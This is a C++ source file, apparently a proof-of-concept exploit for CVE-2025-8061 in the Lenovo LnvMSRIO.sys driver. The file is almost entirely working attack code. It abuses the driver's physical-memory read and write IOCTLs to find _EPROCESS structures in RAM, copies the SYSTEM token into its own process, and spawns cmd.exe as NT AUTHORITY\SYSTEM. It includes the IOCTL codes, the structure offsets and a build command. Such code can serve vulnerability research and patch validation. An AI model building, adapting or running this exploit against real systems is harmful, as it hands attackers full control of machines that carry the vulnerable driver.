/*
 * 02_token_steal.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — Token Stealing
 *
 * Goal: copy the SYSTEM process token into the current process token
 *       → spawn cmd.exe that runs as NT AUTHORITY\SYSTEM.
 *
 * Technique (DKOM — data-only, no code execution)
 * ────────────────────────────────────────────────
 * 1. Scan physical RAM for _EPROCESS structures.
 *    Signature: UniqueProcessId == 4 AND ImageFileName == "System"
 *    → found System _EPROCESS PA
 *
 * 2. Scan for current process _EPROCESS.
 *    Signature: UniqueProcessId == GetCurrentProcessId()
 *    AND ImageFileName matches our own image name.
 *
 * 3. Read Token (_EX_FAST_REF, 8 bytes) from System _EPROCESS.
 *
 * 4. Write that Token value into current process _EPROCESS.Token.
 *    → current process now holds SYSTEM credentials.
 *
 * 5. CreateProcess("cmd.exe") inherits the SYSTEM token.
 *
 * _EPROCESS field offsets (x64, all builds ≥ 19041)
 * ──────────────────────────────────────────────────
 * Field              Offset    Notes
 * UniqueProcessId    +0x440    ULONG_PTR
 * ActiveProcessLinks +0x448    LIST_ENTRY (not used here — we scan phys)
 * Token              +0x4B8    _EX_FAST_REF (8 bytes)
 *                              bits[63:4] = pointer to TOKEN object
 *                              bits[ 3:0] = RefCount (fine to copy as-is)
 * ImageFileName      +0x5A8    char[15], null-padded
 *
 * IOCTL layouts
 * ─────────────
 *   Phys read   0x9c406104
 *     IN  → { UINT64 PA; DWORD AccessSize; DWORD Count }
 *     OUT ← AccessSize × Count bytes
 *
 *   Phys write  0x9c40a108
 *     IN  → { UINT64 PA; DWORD OperationType=1; DWORD AccessSize; BYTE Data[AccessSize] }
 *     OUT ← (ignored)
 *     AccessSize: 1, 2, or 8
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:02_token_steal.exe 02_token_steal.cpp
 *      /link kernel32.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical read ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn  { UINT64 PA; DWORD AccessSize; DWORD Count; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

// ─── Physical write ───────────────────────────────────────────────────────────
//
// The write IOCTL input layout:
//   UINT64  PA
//   DWORD   OperationType  = 1
//   DWORD   AccessSize     = bytes to write (1 / 2 / 8)
//   BYTE[]  Data           = AccessSize bytes of data  (immediately follows)
//
// Total input size = 8 + 4 + 4 + AccessSize

#pragma pack(push, 1)
struct PhysWriteIn1  { UINT64 PA; DWORD OT; DWORD AS; BYTE  Data; };  // 1 byte
struct PhysWriteIn8  { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; }; // 8 bytes
#pragma pack(pop)

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Physical RAM upper bound ─────────────────────────────────────────────────

static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    return (top + 0x1FFFFFULL) & ~0x1FFFFFULL;
}

// ─── _EPROCESS offsets ───────────────────────────────────────────────────────
//
// These are stable across Windows 10 19041 → Windows 11 26100+.
// If Microsoft changes them, run:
//   dt nt!_EPROCESS UniqueProcessId ActiveProcessLinks Token ImageFileName
// in WinDbg to get new values.

struct EprocOffsets {
    DWORD UniqueProcessId;   // +0x440
    DWORD Token;             // +0x4B8  (_EX_FAST_REF, 8 bytes)
    DWORD ImageFileName;     // +0x5A8  (char[15])
};

static EprocOffsets g_off = { 0x440, 0x4B8, 0x5A8 };

// ─── EPROCESS scan ───────────────────────────────────────────────────────────
//
// Strategy: scan physical RAM page-by-page.
// For each 8-byte aligned slot, test:
//   slot + UniqueProcessId == targetPid
//   slot + ImageFileName   starts with targetName
//
// Returns physical address of the _EPROCESS base on success, 0 on failure.
// A 1 MB read window is used per call to amortize IOCTL overhead.

#define SCAN_CHUNK  (1u << 20)   // 1 MB per IOCTL call
#define SCAN_STEP   8u           // scan every 8 bytes (EPROCESS is 8-byte aligned)

static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    uint64_t ram_top = PhysRamTop();

    // Minimum trailing bytes needed past the slot start
    DWORD minTrail = g_off.ImageFileName + 8;

    auto *chunk = (uint8_t *)VirtualAlloc(nullptr, SCAN_CHUNK,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) return 0;

    uint64_t result = 0;

    for (uint64_t pa = 0x100000ULL; pa < ram_top && !result; pa += SCAN_CHUNK) {
        // Skip the PCI/MMIO hole — not RAM on any x64 system
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;

        DWORD readLen = (pa + SCAN_CHUNK <= ram_top)
                        ? SCAN_CHUNK
                        : (DWORD)(ram_top - pa);

        // Read in 4 KB pages — skip unreadable pages (MMIO holes) gracefully.
        // A single 1 MB PhysRead call fails because the driver's page limit is 4 KB.
        bool any_ok = false;
        for (DWORD pg = 0; pg < readLen; pg += 0x1000) {
            DWORD pl = (readLen - pg < 0x1000u) ? (readLen - pg) : 0x1000u;
            if (PhysRead(pa + pg, chunk + pg, pl)) any_ok = true;
            else memset(chunk + pg, 0, pl);
        }
        if (!any_ok) continue;

        for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {

            // Check UniqueProcessId
            ULONG_PTR pid_val = *(ULONG_PTR *)(chunk + off + g_off.UniqueProcessId);
            if ((DWORD)pid_val != targetPid) continue;
            if (pid_val >> 32) continue;  // high 32 bits must be zero for PID

            // Check ImageFileName prefix
            const char *fname = (const char *)(chunk + off + g_off.ImageFileName);
            size_t nameLen = strlen(targetName);
            if (_strnicmp(fname, targetName, nameLen) != 0) continue;

            result = pa + off;
            printf("    [scan] %s  PID=%-6lu  EPROCESS PA=0x%016llX\n",
                   fname, (unsigned long)targetPid, result);
            break;
        }
    }

    VirtualFree(chunk, 0, MEM_RELEASE);
    return result;
}

// ─── Privilege helpers ───────────────────────────────────────────────────────

static void EnablePrivilege(const wchar_t *name)
{
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return;
    LUID luid{};
    LookupPrivilegeValueW(nullptr, name, &luid);
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hTok);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 02 - Token Stealing ===\n\n");

    if (!OpenDevice()) return 1;

    // SeDebugPrivilege not strictly needed here (physical scan bypasses it),
    // but useful for the final CreateProcess call.
    EnablePrivilege(L"SeDebugPrivilege");

    DWORD myPid = GetCurrentProcessId();
    char  myName[MAX_PATH];
    GetModuleFileNameA(nullptr, myName, sizeof(myName));
    // Strip path, keep just the exe name
    const char *myBaseName = strrchr(myName, '\\');
    myBaseName = myBaseName ? myBaseName + 1 : myName;
    // Strip .exe extension for ImageFileName comparison (it's stored without extension
    // on some builds, and with on others — we compare just the base stem)
    char myStem[16] = {};
    strncpy_s(myStem, sizeof(myStem), myBaseName, 15);
    if (char *dot = strrchr(myStem, '.')) *dot = '\0';

    printf("[*] Current process: PID=%lu  name=\"%s\"\n\n", myPid, myBaseName);

    // ── Step 1: find System _EPROCESS ────────────────────────────────────────
    printf("[*] Scanning for System _EPROCESS (PID=4)...\n");
    uint64_t system_eproc_pa = FindEprocess(4, "System");
    if (!system_eproc_pa) {
        printf("[-] System _EPROCESS not found\n");
        CloseHandle(g_dev); return 1;
    }

    // Read System's Token (_EX_FAST_REF)
    uint64_t system_token = 0;
    if (!PhysReadU64(system_eproc_pa + g_off.Token, &system_token) || !system_token) {
        printf("[-] Failed to read System token\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System _EPROCESS @ PA  0x%016llX\n", system_eproc_pa);
    printf("[+] System Token           0x%016llX\n\n", system_token);

    // ── Step 2: find current process _EPROCESS ────────────────────────────────
    printf("[*] Scanning for current process _EPROCESS (PID=%lu, \"%s\")...\n",
           myPid, myStem);
    uint64_t self_eproc_pa = FindEprocess(myPid, myStem);
    if (!self_eproc_pa) {
        printf("[-] Current process _EPROCESS not found\n");
        CloseHandle(g_dev); return 1;
    }

    // Save original token so we can restore it later if needed
    uint64_t orig_token = 0;
    PhysReadU64(self_eproc_pa + g_off.Token, &orig_token);
    printf("[+] Self _EPROCESS @ PA    0x%016llX\n", self_eproc_pa);
    printf("[+] Self Token (before)    0x%016llX\n\n", orig_token);

    // ── Step 3: overwrite Token ───────────────────────────────────────────────
    //
    // _EX_FAST_REF layout:
    //   bits [63:4] = Object pointer (16-byte aligned)
    //   bits [3:0]  = Reference count (kernel manages this)
    //
    // Safest approach: copy System's EX_FAST_REF value directly.
    // The kernel will not crash from a stolen token — it only does a pointer
    // dereference when checking the token, and the System token is valid.
    //
    // If you want to zero out the ref count bits (purist approach):
    //   uint64_t clean_token = system_token & ~0xFULL;
    // In practice, copying the whole value works fine.

    printf("[*] Writing System token to self _EPROCESS.Token...\n");
    if (!PhysWriteU64(self_eproc_pa + g_off.Token, system_token)) {
        printf("[-] PhysWriteU64 failed: %lu\n", GetLastError());
        CloseHandle(g_dev); return 1;
    }

    // Readback to verify
    uint64_t token_after = 0;
    PhysReadU64(self_eproc_pa + g_off.Token, &token_after);
    printf("[+] Self Token (after)     0x%016llX  %s\n\n",
           token_after,
           (token_after == system_token) ? "[MATCH — token stolen!]" : "[MISMATCH]");

    if (token_after != system_token) {
        printf("[-] Token write did not stick — driver may be buffering writes\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 4: spawn SYSTEM cmd.exe ─────────────────────────────────────────
    //
    // CreateProcess inherits the caller's token (which is now SYSTEM).
    // The new process starts with full NT AUTHORITY\SYSTEM privileges.

    printf("[*] Spawning cmd.exe as SYSTEM...\n");

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    BOOL ok = CreateProcessA(
        nullptr,
        (LPSTR)"cmd.exe",
        nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE,
        nullptr, nullptr,
        &si, &pi);

    if (!ok) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        // Restore original token before exit
        PhysWriteU64(self_eproc_pa + g_off.Token, orig_token);
        CloseHandle(g_dev); return 1;
    }

    printf("[+] cmd.exe started  PID=%lu\n", pi.dwProcessId);
    printf("[+] Run   whoami   in the new window to confirm NT AUTHORITY\\SYSTEM\n\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(g_dev);

    // Note: we do NOT restore the token here — restoring it would downgrade our
    // privileges before the child process is fully initialised.
    // The token will be cleaned up when this process exits.

    printf("[+] Done.\n");
    return 0;
}
